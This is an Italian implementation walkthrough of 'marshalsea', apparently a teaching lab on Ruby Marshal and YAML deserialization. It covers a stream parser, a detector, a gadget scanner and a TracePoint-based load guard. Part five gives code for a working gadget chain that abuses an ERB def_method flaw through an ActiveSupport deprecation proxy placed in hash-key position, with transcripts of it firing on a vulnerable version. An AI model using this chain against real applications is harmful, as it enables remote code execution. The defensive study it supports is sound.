<!-- ©AngelaMos | 2026 -->
<!-- 03-IMPLEMENTATION.md -->

# marshalsea: Implementazione

Una walkthrough del codice, nell'ordine in cui i dati si muovono effettivamente: byte in un grafo, un grafo in una decisione, un grafo di classi vivo in una lista di gadget, e un oggetto vivo in un payload. Apri i file accanto a questo. Niente qui cita un numero di riga, perché i numeri di riga marciscono; tutto è nominato per metodo.

Ogni trascrizione in questo capitolo è stata prodotta eseguendo il codice in `ruby:4.0-slim` (Ruby 4.0.6). Se esegui la stessa cosa e ottieni qualcosa di diverso, credi al tuo terminale.

## Parte uno: byte in un grafo

`Marshalsea::Marshal::Parser` è un reader a discesa ricorsiva sul formato wire di Marshal. Inizia con i dump più semplici possibili e leggi i byte:

```
Marshal.dump(nil)      "\x04\b0"
Marshal.dump(true)     "\x04\bT"
Marshal.dump(1)        "\x04\bi\x06"
Marshal.dump(:hi)      "\x04\b:\ahi"
Marshal.dump("hi")     "\x04\bI\"\ahi\x06:\x06ET"
Marshal.dump([1, 2])   "\x04\b[\ai\x06i\a"
Marshal.dump({a: 1})   "\x04\b{\x06:\x06ai\x06"
```

`"\x04\b"` è l'header di versione, major 4 minor 8, su ogni stream. Dopo di esso c'è un byte di tag e poi qualunque cosa quel tag richieda.

### Il dispatch

`read_value` è un `case` sul byte del tag ed è l'intera grammatica. La cosa interessante di esso è ciò che *non* fa: non c'è risoluzione di classe, nessun `const_get`, nessuna allocazione di nulla dallo stream. Un `TAG_OBJECT` produce un `Node` con `type: :object` e una stringa `class_name`. La stringa `"Gem::Requirement"` non diventa mai la costante `Gem::Requirement`.

Tre rami di quel case sono i sink:

```ruby
when TAG_USERDEF     then register(read_userdef(tag, depth))      # u -> Klass._load
when TAG_USERMARSHAL then read_usermarshal(tag, depth)            # U -> obj.marshal_load
when TAG_DATA        then read_wrapped(tag, :data, depth)         # d -> Klass._load_data
```

Tutto a valle che ragiona sui sink legge `Node#sink?` e `Node#sink_method`, che sono lookup in una tabella di costanti congelata indicizzata per tag. Aggiungere un quarto tag di sink significa aggiungere una voce, non modificare un predicato.

### Il packing dei fixnum, perché lo incontrerai immediatamente

`read_fixnum` implementa l'intero a larghezza variabile di Marshal, e vale la pena capirlo perché *ogni* lunghezza nel formato ne è uno:

```ruby
marker = take_signed_byte
return 0 if marker.zero?
return marker - FIXNUM_INLINE_OFFSET if marker > FIXNUM_MAX_INLINE   # marker >  4
return marker + FIXNUM_INLINE_OFFSET if marker < FIXNUM_MIN_INLINE   # marker < -4
# otherwise |marker| is a BYTE COUNT, and the value follows little-endian
```

Quindi gli interi piccoli sono inline con un bias di 5, e quelli più grandi dichiarano una larghezza. Ora la stringa di byte sopra si decodifica a vista:

```
"\x04\b{\x06:\x06ai\x06"
        ^^^^                 marker 6, so fixnum 1: the hash has 1 entry
            ^^^^             marker 6, so 1: the symbol name is 1 byte
                ^            "a"
                 ^^^^^^      tag i, marker 6, so the value is 1
```

E le lunghezze dei nomi di classe funzionano in modo identico. `"\x15Gem::Requirement"` è marker 0x15 = 21, quindi 21 - 5 = 16 byte di nome, e `"Gem::Requirement".length` è 16.

### Le due tabelle di back-reference

Marshal deduplica, ed entrambi i meccanismi sono basati su indici. Questo conta più di quanto sembri.

**I simboli** vanno in una tabella man mano che vengono definiti. `TAG_SYMBOL` fa append a `symbols`; `TAG_SYMLINK` rilegge un indice. **Gli oggetti** vanno in una tabella separata via `register`, e `TAG_OBJECT_LINK` legge un indice da quella. `read_symlink` e `read_object_link` fanno entrambi il bounds-check e sollevano `InvalidLinkError` su un indice negativo o fuori range, perché un link fuori range è uno stream che rivendica un riferimento a un oggetto che non esiste.

Dumpare due `Gem::Version` mostra entrambe le tabelle al lavoro:

```
"\x04\b[\aU:\x11Gem::Version[\x06I\"\x061\x06:\x06ETU;\x00[\x06I\"\x062\x06;\x06T"
                                                          ^^^^                      symlink 0 -> :"Gem::Version"
                                                                              ^^^^  symlink 1 -> :E
```

Il secondo `Gem::Version` non è scritto per esteso; è `;\x00`, symlink indice zero. Qualsiasi codice che ragiona su "quali classi sono in questo stream" deve risolvere i symlink o mancherà interamente il secondo. `Node` memorizza il valore del simbolo risolto al momento del parsing così i consumatori a valle non devono mai pensarci.

Gli object link sono quelli che mordono. `Node#link_target` è impostato al nodo effettivamente registrato, e `effective_class_name` lo segue:

```ruby
def effective_class_name
  link_target ? link_target.class_name : class_name
end
```

Senza di esso, un payload che mette l'oggetto pericoloso in posizione di valore e poi lo riferisce per indice dalla posizione di chiave mostrerebbe una chiave il cui `class_name` è `nil`. Il corpus ha esattamente quel caso (`hash_key_object_link`), e lo rifiuta.

### I budget vengono addebitati al punto di consumo

`Budget` è filato attraverso il parser e ogni read lo addebita prima di allocare. `read_counted_bytes` addebita `scalar!(size)` **prima** di `take(size)`, quindi uno stream che dichiara una stringa da 900 MB viene rifiutato alla dichiarazione anziché dopo l'allocazione. `read_entry_count` addebita prima del loop. `register` addebita prima di fare append.

Quell'ordinamento è l'intero punto di avere un budget:

```
DepthLimitError:      exceeded depth 4
LimitExceededError:   stream bytes 110 exceeds 8
```

### Sigillatura

`parse` termina con `root.each(&:seal)` e restituisce un `Result` congelato. `Node#seal` congela il valore, il nome della classe, l'undecoded tail, entrambi gli array di figli, entrambe le collezioni di variabili d'istanza, e infine il nodo. Il grafo restituito è immutabile, quindi un chiamante che tiene un `Decision#result` non può mutare il registro da cui è stata presa una decisione di policy.

## Parte due: il grafo risponde alle domande

`Result` è un insieme di query sul grafo congelato. `nodes` è `root.each`, un enumeratore depth-first che percorre i figli **e** l'array `auxiliary`, che è dove vivono i simboli dei nomi di classe e le coppie nome/valore delle variabili d'istanza. Mancare `auxiliary` significherebbe mancare qualsiasi cosa nascosta in uno slot di nome, che è esattamente il caso dell'anomalia che il parser esiste per preservare.

```ruby
def class_names = nodes.filter_map(&:class_name).uniq
def sinks       = nodes.select(&:sink?)
```

Eseguilo su uno stream reale:

```ruby
blob = Marshal.dump(Gem::Requirement.new(">= 0"))
r    = Marshalsea::Marshal::Parser.new(blob).parse

r.class_names
# => ["Gem::Requirement", "Gem::Version"]
r.sinks.map { |s| "#{s.class_name}##{s.sink_method}" }
# => ["Gem::Requirement#marshal_load", "Gem::Version#marshal_load"]
```

62 byte, due classi, due dispatch di `marshal_load`, e niente è stato caricato.

### Il dispatch in posizione di chiave è una domanda ricorsiva

`hash_keys` raccoglie il primo elemento di ogni `:pair` sotto ogni `:hash`. Poi a ogni chiave viene chiesto se farla rivivere invochi `#hash` o `#eql?`. Quella domanda non è "questa chiave è un oggetto," perché la cosa pericolosa può essere **annidata**:

```ruby
def hash_dispatcher(seen = {}.compare_by_identity)
  return nil if seen.key?(self)

  seen[self] = true
  return link_target&.hash_dispatcher(seen) if type == :object_link
  return member_dispatcher(:hash_dispatcher, seen) unless class_name
  return nil if WRAPPER_TYPES.include?(type) && string_backed?

  self
end
```

Quattro comportamenti in sei righe:

- **Sicurezza sui cicli.** `seen` è confrontato per identità, quindi un grafo con un object link che punta indietro nella propria genealogia termina invece di ricorrere all'infinito.
- **Segui i link.** Un object link delega a qualunque cosa punti.
- **Discendi nei container.** Un nodo senza `class_name` è un container semplice, quindi interroga i suoi membri. È questo che intercetta `{ [gadget] => 1 }`, il bypass con chiave Array nuda, in 19 byte.
- **Rispetta il fast path di String.** `WRAPPER_TYPES` è `:user_class` e `:extended`, e `string_backed?` controlla se il nodo avvolto è una stringa o una regexp. Una sottoclasse di `String` usata come chiave di hash **non ha mai `#hash` chiamato**, perché il `rb_any_hash` di CRuby tratta come caso speciale `T_STRING`. Riportarlo sarebbe un falso positivo.

`eql_dispatcher` è quasi identico e deliberatamente **omette** l'ultima clausola. Una sottoclasse di `String` salta `#hash` ma raggiunge comunque `#eql?` su collisione di bucket. Due metodi che sembrano copia-incolla differiscono per esattamente una riga, e quella riga è un bypass rilasciato.

I Range ottengono il loro percorso. `range_endpoints` legge le variabili d'istanza `begin` ed `end` di qualsiasi nodo il cui `effective_class_name` è `"Range"`, perché `Range#marshal_load` valida i suoi estremi con `#<=>`.

## Parte tre: il grafo diventa una decisione

`BoundaryDetector#inspect_stream` è abbastanza breve da leggere per intero:

```ruby
def inspect_stream(input)
  return reject(REASON_INPUT_TYPE) unless input.is_a?(String)

  snapshot = input.dup.force_encoding(Encoding::BINARY).freeze
  result = Parser.new(snapshot, limits: limits).parse
  evaluate(result, snapshot)
rescue StreamError => e
  reject(format(REASON_MALFORMED, e.class.name.split("::").last))
end
```

Tre cose da notare. L'input è **duplicato, forzato a binario e congelato** prima che qualsiasi cosa lo legga, quindi il chiamante non può mutare i byte tra la decisione e il load (`decision.snapshot` è ciò che dovresti passare a `Marshal.load`, non l'originale). Ogni errore del parser viene catturato come la sua classe base `StreamError`, quindi un nuovo tipo di errore aggiunto al parser non può trapelare come eccezione non gestita. E la stringa di motivazione porta solo il **nome della classe dell'errore**, non il suo messaggio, perché il messaggio può contenere offset e dimensioni influenzati dall'attaccante.

`violation_for` è la scala di [02-ARCHITECTURE.md](./02-ARCHITECTURE.it.md), in ordine, che restituisce il primo riscontro. Poi `evaluate` trasforma una violazione in uno dei tre stati, e la modalità di monitoraggio è l'unico ramo che chiama il reporter e restituisce comunque uno snapshot.

Osservando tutti e tre gli stati su payload reali:

```
usermarshal sink        blocked  stream reaches "Gem::Requirement"#marshal_load during load, before any
                                 allowlist can run
object in key position  blocked  stream reaches "Gem::Version"#marshal_load during load, before any
                                 allowlist can run
bare Array key          blocked  stream puts "Ungated" in a hash key, so its #hash runs during load,
                                 before any allowlist can act
Range endpoint          blocked  stream puts "Ungated" in a Range endpoint, so its #<=> runs during
                                 load, before any allowlist can act
benign 45-byte session  proceed
same session with ERB   blocked  stream references unapproved class "ERB"
```

E il terzo stato, che è quello di cui la gente dimentica l'esistenza:

```
state=observed  proceed?=false  blocked?=false  observed?=true
snapshot present=true  reported=1
```

`observed` non è `proceed`. Un chiamante che scrive `Marshal.load(d.snapshot) if d.proceed?` ottiene gratis il comportamento sicuro in modalità di monitoraggio, che è il motivo per cui non c'è alcun predicato `accepted?` con cui sbagliare questo.

Nota l'ultima stringa di motivazione in quella trascrizione. `"stream references unapproved class \"ERB\""` è l'**unica** regola che intercetta la chain della CVE pubblicata, perché quel payload non contiene alcun tag di sink:

```ruby
Marshalsea::Chains::ErbDefMethod.canary("/tmp/c", "m").serialize
# 112 bytes
# class_names = ["ERB"]
# sinks       = 0        <-- zero sink tags
```

Quel fatto è scritto in `LIMITATION_NOTICE` come costante anziché lasciato in una doc, così un chiamante che fa grep della libreria per i suoi stessi caveat lo trova.

## Parte quattro: a caccia nel grafo di classi

`Scanner#scan` percorre `ObjectSpace.each_object(Module)`, e per ogni modulo con nome raccoglie i metodi auto-invocati che il modulo definisce **esso stesso**:

```ruby
def own_instance_methods(mod, name)
  (mod.instance_methods(false) +
   mod.private_instance_methods(false) +
   mod.protected_instance_methods(false)).map(&:to_s)
rescue StandardError => e
  suppress(SITE_OWN_METHODS, name, e)
  []
end
```

`false` significa "non ereditato," che è la differenza tra trovare la classe che *definisce* un gadget e trovare tutte le sue 400 sottoclassi. Private e protected sono inclusi perché `Marshal` applica il gate su `respond_to?(m, true)`, e quel `true` significa che i metodi privati contano.

Ognuno di questi helper ha la stessa forma: rescue, `suppress` con un sito nominato, restituisci un risultato vuoto. Niente solleva fuori da una scan, e niente va perso silenziosamente.

### Decidere se un metodo ungated è interessante

Per un metodo gated il solo tag lo raggiunge, quindi è raggiungibile per definizione. Per uno ungated come `#hash`, lo scanner deve indovinare se il corpo fa qualcosa. `state_reference_in` fa il parsing del file che lo definisce con Prism, trova il `DefNode` alla riga del `source_location` del metodo, e chiede:

```ruby
def state_reference?(node)
  return false unless node.is_a?(Prism::Node)
  return true if node.is_a?(Prism::InstanceVariableReadNode)
  return true if node.is_a?(Prism::CallNode) && node.receiver.nil?

  node.compact_child_nodes.any? { |child| state_reference?(child) }
end
```

Legge una variabile d'istanza, o fa una chiamata senza receiver. Un `#hash` che restituisce un letterale è inerte; un `#hash` che legge `@name` o chiama un metodo fratello è un potenziale pivot. I file analizzati sono cachati per path, perché fare il parsing Prism di `rubygems/specification.rb` una volta per candidato sarebbe lento e inutile.

Le direzioni di fallimento sono la parte interessante. Nessun Prism, o nessun source location affatto, dà `:unanalysable`. Un file che non vuole fare parsing, o una riga senza alcun `DefNode`, dà `:unreadable`. E poi:

```ruby
def reachable?
  return false unless entry_point?
  return false unless accepts_dispatch?
  return true if gated? || soft_gated?

  touches_state? || unreadable_source?
end
```

`unreadable_source?` conta come raggiungibile. Quando lo strumento non riesce a dirlo, dice "forse pericoloso," non "inerte." Su un'image di default sono 8 candidati:

```
unreadable_source candidates: 8
  ERB::Compiler::PercentLine#to_s     reachable=false      <- a LINK, excluded before this ever ran
  Pathname#==                         reachable=true
  Pathname#eql?                       reachable=true
  Pathname#hash                       reachable=true
  Pathname#to_s                       reachable=false
  Ractor#[]=                          reachable=true
  Symbol#to_s                         reachable=false
```

Le righe `to_s` sono la tassonomia che si guadagna il suo posto. Sono illeggibili *e* sono link, e `entry_point?` le rifiuta prima che l'analisi dello stato conti affatto.

I 142 candidati `unanalysable` sono metodi definiti in C senza alcun sorgente Ruby. `fully_analysed?` restituisce false e la scan lo dice in inglese semplice anziché stampare una lista dall'aria pulita.

### Il gate dell'arity

```ruby
def accepts_dispatch?
  required = dispatch_arity
  return true if required == VARIADIC
  return arity == required unless arity.negative?

  required >= (arity.abs - 1)
end
```

Un `Method#arity` negativo significa argomenti opzionali o splat, e `arity.abs - 1` è il conteggio di quelli richiesti, quindi il controllo è "il deserializzatore ne fornisce almeno quanti ne richiede questo metodo." Su un'image di default rifiuta esattamente un candidato, ed è un buon esempio:

```
entry points whose arity cannot accept the deserializer's call: 1
  Psych::Visitors::ToRuby#init_with               arity=3    needs=1
```

Il metodo visitor di Psych stesso condivide un nome con l'hook che invoca. Senza la colonna dell'arity quello starebbe in cima a ogni scan per sempre.

## Parte cinque: costruire il payload

Questo è il pezzo forte. `erb-def-module` scatta dentro `Marshal.load` senza alcuna cooperazione dall'applicazione, e ci vogliono tre trucchi separati per arrivarci.

### Trucco uno: forgiare l'ERB oltre la guardia

CVE-2026-41316 è una guardia che copre `ERB#result` ed `ERB#run` ma non `ERB#def_method`. La forgiatura sono tre variabili d'istanza su un oggetto allocato, e deliberatamente non chiama mai `ERB#initialize`, perché `initialize` è ciò che imposta `@_init`:

```ruby
def template
  object = ERB.allocate
  object.instance_variable_set(IVAR_SRC, src)
  object.instance_variable_set(IVAR_FILENAME, DEFAULT_FILENAME)
  object.instance_variable_set(IVAR_LINENO, DEFAULT_LINENO)
  object
end
```

`@src` è il sorgente del template compilato che `def_method` farà `module_eval`. E `src` è dove vive la primitiva effettiva:

```ruby
SRC_PREFIX = "#\nend\n"
SRC_SUFFIX = "\ndef _marshalsea_unused\n"

def src = "#{SRC_PREFIX}#{@ruby_source}#{SRC_SUFFIX}"
```

Sei caratteri davanti e ventiquattro in coda, ed entrambi gli estremi sono portanti. `ERB#def_method` costruisce il metodo così, letto dal sorgente distribuito:

```ruby
src = self.src.sub(/^(?!#|$)/) { "def #{methodname}\n" } << "\nend\n"
```

Non antepone. Inserisce `def <name>` prima della **prima riga che non è né un commento né vuota**, perché un `@src` ERB realmente compilato si apre con `#coding:UTF-8` e quel commento magico deve restare sulla riga uno. Quindi il `#` iniziale di `SRC_PREFIX` è un commento magico forgiato il cui unico compito è spingere il punto di inserimento una riga più giù, sull'`end`:

```ruby
#                                     # forged magic comment, the sub skips it
def render_it                         # the wrapper lands on the `end` line
end                                   # and closes immediately: an empty method
File.write("/tmp/canary", "pwned")    # now at module_eval top level
def _marshalsea_unused                # a second empty method, which absorbs the
                                      # "\nend\n" that def_method appends
end
```

Fai passare quello attraverso `module_eval` e il payload viene eseguito durante `eval`, con due metodi vuoti lasciati come detriti:

```
fired during eval: [:RAN_AT_EVAL_TIME]
methods defined:   [:_marshalsea_unused, :render_it]
```

Questo converte "definisce un metodo contenente il mio codice" in "**esegue il mio codice ora**," che è la differenza tra un payload che aspetta che qualcuno chiami un metodo e un payload che scatta durante il load. È l'intero motivo per cui l'advisory chiama `def_method` sfruttabile anziché meramente non protetto.

### Trucco due: far chiamare `def_module` da qualcosa al posto tuo

L'ERB forgiato è inerte finché qualcosa non chiama un metodo `def_*` su di esso. `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` è un dispatcher `method_missing`: inoltra qualsiasi metodo mancante a `@instance.send(@method)`. Imposta quelle due ivar e il proxy diventa un trigger:

```ruby
def generate
  proxy = self.class.dispatcher_class.allocate
  SET_IVAR.bind_call(proxy, IVAR_INSTANCE, template)      # the forged ERB
  SET_IVAR.bind_call(proxy, IVAR_METHOD, DISPATCH_METHOD) # :def_module
  SET_IVAR.bind_call(proxy, IVAR_VAR, PROXY_LABEL)
  SET_IVAR.bind_call(proxy, IVAR_DEPRECATOR, deprecator)
  proxy
end
```

`def_module` è scelto rispetto a `def_method` per un motivo: **non prende argomenti**, quindi un `send` cieco senza argomenti lo raggiunge. `def_method` ha bisogno di un modulo e un nome, che un forwarder `method_missing` non fornirà.

Nota `SET_IVAR.bind_call`. Quello è `Object.instance_method(:instance_variable_set)`, catturato una volta al momento del load e legato al proxy. Un semplice `proxy.instance_variable_set(...)` passerebbe attraverso il `method_missing` del proxy stesso, che inoltra a `@instance` e attiva la chain mentre la stai ancora costruendo. Il proxy è ostile al proprio costruttore.

`deprecator` costruisce un `ActiveSupport::Deprecation` silenziato così il proxy non stampa un avviso di deprecazione nel passaggio, cosa che annuncerebbe il payload nei log del target.

### Trucco tre: metterlo in posizione di chiave senza eseguirlo

Il proxy scatta su `#hash`. Costruire `{ proxy => 1 }` in Ruby chiama `#hash` sulla chiave al momento dell'inserimento, nel **tuo** processo. Quindi il builder non costruisce mai l'hash:

```ruby
def in_hash_key_position(object)
  body   = ::Marshal.dump(object).byteslice(HEADER_BYTES..)
  header = ::Marshal.dump(nil).byteslice(0, HEADER_BYTES)
  refuse_object_links("#{header}#{HASH_WITH_ONE_ENTRY}#{body}#{NIL_VALUE}".b)
end
```

`HASH_WITH_ONE_ENTRY` è `"{\x06"`, il tag hash più un fixnum inline 1. `NIL_VALUE` è `"0"`. Quindi il payload è assemblato come byte: un header, un frame di hash a una voce, il dump autonomo del proxy innestato come chiave, e un valore `nil`. `Marshal.dump` è chiamato sul proxy da solo, cosa che non lo mette mai in un hash, cosa che non chiama mai `#hash`.

E poi il rifiuto:

```ruby
def refuse_object_links(stream)
  graph = Marshalsea::Marshal::Parser.new(stream).parse
  return stream if graph.nodes.none? { |node| node.type == :object_link }

  raise ObjectLinkRefusedError, OBJECT_LINK_REFUSED
end
```

Gli object link sono posizionali. `@6` significa "il sesto oggetto registrato," e innestare un body dietro un nodo hash sposta ogni indice di uno. Un grafo di payload contenente una back-reference si decodificherebbe silenziosamente in un *grafo diverso* da quello costruito. Quindi il builder fa il parsing del proprio output con il parser della libreria stessa e rifiuta se qualche link è sopravvissuto. Un generatore di payload che può produrre un grafo che non intendeva è peggio di uno che si rifiuta di produrre qualcosa.

Questo è anche un bel ciclo chiuso: la metà offensiva si valida con il reader della metà difensiva.

### L'intera cosa, end to end

Costruito, serializzato, ispezionato e caricato su `ruby:4.0.2-slim` con erb **6.0.1**, una versione vulnerabile:

```
payload bytes=308
class_names=["ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", "ERB",
             "ActiveSupport::Deprecation"]
sink tags=0
hash_dispatching_keys=["ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"]

detector (deny_sinks_only) -> blocked: stream puts "ActiveSupport::Deprecation::
  DeprecatedInstanceVariableProxy" in a hash key, so its #hash runs during load,
  before any allowlist can act

canary2 before: false
canary2 after Marshal.load: true PWNED-VIA-LOAD
```

308 byte, **zero tag di sink**, e un file su disco dopo un semplice `Marshal.load`. Niente ha chiamato un metodo sul risultato. Il detector lo rifiuta comunque, e lo rifiuta sulla regola della posizione di chiave anziché sulla regola del sink, che è il motivo per cui le regole da 3 a 5 della scala esistono affatto.

Lo stesso payload su `ruby:4.0.6-slim` con erb **6.0.4**, a un `docker pull` di distanza, non arriva così lontano. Ruby ti stampa la chain nel modo in cui esce:

```
ERB#def_method: not initialized (ArgumentError)
  from ERB#def_module
  from ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy#target
  from ActiveSupport::Deprecation::DeprecationProxy#method_missing
  from proxy.hash
```

Leggi quello stack dal basso verso l'alto ed è il diagramma della chain di [01-CONCEPTS.md](./01-CONCEPTS.it.md), scritto dall'interprete. Il `not initialized` in cima è la patch di CVE-2026-41316: un controllo `@_init` aggiunto a `def_method`, che chiude `def_module` e `def_class` con esso.

## Parte sei: il veto a runtime

`LoadGuard#load` è piccolo perché `TracePoint` fa il lavoro:

```ruby
def load(blob)
  seen = []
  tracer = TracePoint.new(*EVENTS) { |event| inspect_event(event, seen) }
  result = nil
  begin
    tracer.enable { result = ::Marshal.load(blob) }
  ensure
    @observations = seen.freeze
  end
  result
end
```

`EVENTS` è `[:call, :c_call]`. Un evento `:call` scatta **all'ingresso del metodo, prima del corpo**, che è precisamente il punto di veto che la proc di allowlist ti nega. `inspect_event` filtra agli hook osservati, risolve il nome della classe del receiver, registra un `Observation`, e solleva se il proprietario non è permesso:

```ruby
permitted = !owner.nil? && permitted_class_names.include?(owner)
seen << Observation.new(class_name: label, method_name: event.method_id, permitted: permitted)
return if permitted

raise GuardedLoadError, format(REASON, label, event.method_id)
```

Il `!owner.nil? &&` non è decorazione. Una classe anonima ha un nome `nil`, e `[].include?(nil)` è false, ma una lista di permessi contenente `nil` la farebbe matchare. Fallire chiuso su un proprietario senza nome è la direzione giusta, e l'osservazione lo registra comunque come `"(class with no name)"` così il veto è spiegabile in seguito.

### L'invariante che rende reale il veto

`owner_name` risolve la classe del receiver **senza invocare un singolo metodo sul receiver**:

```ruby
CLASS_OF = ::Object.instance_method(:class).freeze
KIND_OF  = ::Object.instance_method(:is_a?).freeze
NAME_OF  = ::Module.instance_method(:name).freeze

def owner_name(receiver)
  owner = KIND_OF.bind_call(receiver, ::Module) ? receiver : CLASS_OF.bind_call(receiver)
  name = NAME_OF.bind_call(owner)
  name if name.is_a?(String) && !name.empty?
rescue StandardError
  nil
end
```

Sembra paranoia finché non ricordi cosa sta ispezionando la guardia. **Il receiver è il gadget.** Un proxy con i metodi cancellati risponde a `.class`, `.is_a?` e `.name` attraverso `method_missing`, e sulla chain che questo laboratorio distribuisce, `method_missing` è il trigger. Una guardia scritta nel modo ovvio, `receiver.is_a?(Module) ? receiver : receiver.class`, quindi *attiva la chain mentre decide come chiamarla*, e poi pone il veto su un payload che è già stato eseguito.

Peggiora, perché Ruby non traccia le chiamate annidate di un handler `TracePoint` stesso. Confermato:

```
methods traced with a plain handler:                     [:outer, :inner]
methods traced when the handler itself calls :inner:     [:outer, :inner]
```

`:inner` appare una volta, non due. Quindi la detonazione innescata dall'interno dell'handler è invisibile alla guardia *e* non protetta da essa.

Il fallimento è rumoroso una volta che conosci il fingerprint. Ripristinare i tre `bind_call` ed eseguire la chain distribuita dà questo:

```
strict guard: blocked -> deserialization hook (class with no name)#method_missing is not permitted
canary created? true
```

Bloccato, e il payload è comunque stato eseguito. `(class with no name)` è la spia: `receiver.class` era stato risposto da `method_missing`, che ha restituito il `Module` anonimo che `ERB#def_module` produce, che non ha nome. Con le chiamate unbound lo stesso load riporta il proprietario reale e il canary non appare mai:

```
strict   vetoed: ...DeprecatedInstanceVariableProxy#method_missing is not permitted   canary_fired=false
default  vetoed: ...DeprecatedInstanceVariableProxy#method_missing is not permitted   canary_fired=false
```

`test_the_guard_never_dispatches_a_method_on_the_receiver_it_inspects` lo blocca, ed è verificabile in isolamento: strumenta il `method_missing` di un proxy azzerato e asserisci che niente in `[:class, :is_a?, :name]` gli sia mai stato chiesto.

```
against the fixed guard:   dispatched on the receiver: []
against the reverted one:  dispatched on the receiver: [:is_a?, :class]
```

Generalizzalo prima di scrivere una guardia tua: **qualsiasi cosa ispezioni un oggetto ostile non deve fare domande a quell'oggetto.** Fai l'unbind del metodo dalla classe di cui ti fidi e fai il bind al receiver di cui non ti fidi.

`observations` è popolato in un `ensure`, quindi un load che solleva ti lascia comunque la traccia di cosa è scattato prima. Questa è la differenza tra "bloccato" e "bloccato, ed ecco cosa ha tentato."

In pratica:

```
benign session         -> {user: "guest", template: "hello"}, observations=[]
Gem::Requirement dump  -> vetoed: deserialization hook Gem::Version#marshal_load is not permitted
```

E il buco documentato, sullo stesso payload ungated da 19 byte:

```
default guard  -> LOADED, #hash fired, watches?(:hash)=false
strict guard   -> blocked: deserialization hook OKey#hash is not permitted, #hash never fired
detector       -> blocked, nothing loaded at all
```

Tre strumenti, tre risposte, un payload. Il `LIMITATION_NOTICE` della guardia stessa indica la terza colonna come il posto più economico dove intercettarlo.

## Parte sette: percorrere un documento YAML

`Marshalsea::Psych::Walk` è un visitor sull'AST che `Psych.parse_stream` restituisce. L'unica parte astuta è tracciare la posizione di chiave:

```ruby
def descend(node, depth)
  children = node.children
  return unless children

  mapping = node.is_a?(::Psych::Nodes::Mapping)
  children.each_with_index do |child, index|
    visit(child, depth + 1, mapping && (index % MAPPING_KEY_STRIDE).zero?)
  end
end
```

Un `Psych::Nodes::Mapping` memorizza i suoi figli come una lista piatta alternata, chiave, valore, chiave, valore. Quindi gli indici pari sono chiavi. Quel singolo `% 2 == 0` è ciò che permette all'inspector di dire "questa classe è in una **chiave di mapping**, quindi i suoi `#hash` e `#==` vengono eseguiti mentre il mapping viene ricostruito," che è l'equivalente YAML della regola della chiave di hash di Marshal ed è controllato per primo in `violation_for` per lo stesso motivo.

`record` è l'altra metà:

```ruby
kind, class_name = Tags.parse(node.tag)
return unless kind

@references << Reference.new(class_name: class_name, kind: kind, key_position: key_position)
```

`Tags::PATTERN` è `%r{\A!ruby/(?<kind>[a-z_-]+)(?::(?<class_name>.+))?\z}`, ancorato a entrambi gli estremi così che un tag che meramente *contiene* `!ruby/` non matchi. Il nome della classe è opzionale perché `!ruby/object` senza classe è un tag legale che non fa rivivere niente di nominabile, e `revivable` li filtra prima del controllo di allowlist così che un tag senza nome non possa essere "non approvato."

Gli alias incrementano un contatore e non vengono mai espansi. I limiti sono controllati dentro `visit`, quindi profondità, conteggio dei nodi e conteggio degli alias falliscono tutti prima che il walk continui anziché dopo che è completato.

```ruby
insp.inspect_document("--- !ruby/object:Gem::Version\nversion: '1'\n")
# blocked: document revives unapproved class "Gem::Version" through init_with
```

Nota "through `init_with`." La stringa di motivazione nomina il metodo che il tag invocherebbe, non solo la classe, che è l'intero motivo per cui la tabella tag-a-metodo esiste.

## Parte otto: come si sa che tutto questo funziona

La disciplina qui è che **una suite verde non prova nulla finché la cosa sotto test non è stata mutata.** 268 test su sette suite è un numero, non un argomento. Tre pratiche specifiche sono ciò che lo rende un argomento.

**Oracoli differenziali.** I test non asseriscono contro un modello derivato da una spec di cosa fa Ruby. Eseguono il vero `Marshal.load` e il vero `Psych` sotto un `TracePoint`, osservano cosa è stato effettivamente invocato, e asseriscono che il modello della libreria concordi. Questo ha trovato quattro difetti che le asserzioni derivate da spec avevano mancato.

**Guardie di liveness in entrambe le direzioni.** Un oracolo differenziale può fallire in due modi: può non osservare nulla (e passare in modo vacuo) o osservare tutto (e non provare nulla). Quindi le asserzioni vengono a coppie:

```ruby
assert_includes observed.values, true,  "no version accepted, so the oracle is dead"
assert_includes observed.values, false, "every version accepted, so the oracle proves nothing"
```

C'è un `test_load_watcher_oracle_is_live` autonomo il cui unico compito è confermare che il watcher scatti su un load noto-buono, così i test che dipendono da esso non possono passare per silenzio.

**Il test pezzo forte.** L'argomento delle due allowlist non è asserito in prosa da nessuna parte nella suite. È eseguito:

```ruby
assert_raises(::Psych::DisallowedClass) { ::Psych.safe_load(document, permitted_classes: []) }
assert_empty FIRED, "Psych checks the tag before revival, so init_with never ran"

FIRED.clear
::Marshal.load(Marshal.dump(MarshalGadget.new), ->(object) { object }) rescue nil
assert_equal [:marshal_load], FIRED,
             "Marshal runs its proc in r_post_proc, after load_funcall has already fired the callback"
```

Due deserializzatori, un'idea, esiti opposti, e il messaggio di fallimento spiega il meccanismo anziché ribadire l'asserzione. C'è un test compagno per il proxy con i metodi cancellati che asserisce che la *stessa classe* è un entry point Psych valido e uno Marshal non valido, in entrambe le direzioni, in un corpo di test.

L'abitudine si generalizza ed è la cosa che vale la pena rubare da questo progetto: ogni regola viene fornita con il mutante che la uccide. Se aggiungi una regola che afferma che il codice fa X, vai a rompere X e guarda un test diventare rosso. Dodici mutanti sono stati uccisi in questo modo durante lo sviluppo, e due bypass del detector erano stati rilasciati sotto 110 test verdi prima che quella disciplina venisse applicata.

## Dove andare dopo

[04-CHALLENGES.md](./04-CHALLENGES.it.md) è il percorso di estensione: una nuova chain, uno scanner che segue i link in chain reali, chiudere il bypass a esecuzione differita della guardia, e il capstone che ti fa rompere questo strumento con un payload che attualmente accetta.
